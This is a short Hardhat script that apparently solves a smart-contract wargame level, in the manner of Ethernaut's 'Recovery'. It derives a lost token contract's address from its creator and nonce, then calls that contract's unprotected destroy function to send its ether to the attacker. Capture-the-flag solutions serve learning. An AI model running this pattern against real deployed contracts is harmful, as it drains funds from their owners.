import { fail } from "assert";
import { expect } from "chai";
import { ethers } from "hardhat";

async function recoveryExploit() {
  const recoveryAddress = process.env.RECOVERY_ADDRESS || fail("RECOVERY_ADDRESS Not Found In .env");
  const [attacker] = await ethers.getSigners();

  const simpleTokenAddr = ethers.utils.getContractAddress({ from: recoveryAddress, nonce: 1 });

  const simpleTokenBalance = await ethers.provider.getBalance(simpleTokenAddr);
  expect(simpleTokenBalance.gt(0)).to.be.equal(
    true,
    "Computed address is not correct. Balance should be greater than 0."
  );

  console.log("Computed address : ", simpleTokenAddr);

  const simpleToken = await ethers.getContractAt("SimpleToken", simpleTokenAddr);

  console.log("SimpleToken Balance Before Hack : ", (await ethers.provider.getBalance(recoveryAddress)).toString());

  const attackerAddress = await attacker.getAddress();
  const tx = await simpleToken.destroy(attackerAddress);
  await tx.wait(1);

  console.log("SimpleToken Balance After Hack : ", (await ethers.provider.getBalance(recoveryAddress)).toString());
  console.log("SUCCESS!!! Submit the instance.");
}

recoveryExploit().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
